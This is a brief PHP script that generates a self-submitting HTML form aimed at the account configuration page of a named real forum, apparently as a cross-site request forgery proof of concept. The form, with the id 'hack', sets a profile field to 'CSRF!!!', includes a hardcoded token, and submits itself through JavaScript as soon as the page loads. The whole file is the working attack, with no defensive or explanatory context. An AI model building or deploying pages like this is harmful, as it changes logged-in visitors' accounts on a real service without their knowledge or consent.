<?php

$url = "https://www.mediavida.com/usuarios/config/general.php";

$values = [
    ["info", "CSRF!!!"],
    ["token", "1542545141c10b10c6ffc9495494f2280ce4c2275f681506bc"]
];

$head = "<form method=\"POST\" id=\"hack\" action=\"$url\">";
$content = "<input type=\"submit\" value=\"submit\" />";
$foot = "</form>
<script>document.getElementById(\"hack\").submit()</script>";

foreach ($values as $i => $v) {
    $content .= "<input type=\"text\" name=\"$v[0]\" value=\"$v[1]\" />";
}

echo $head.$content.$foot;


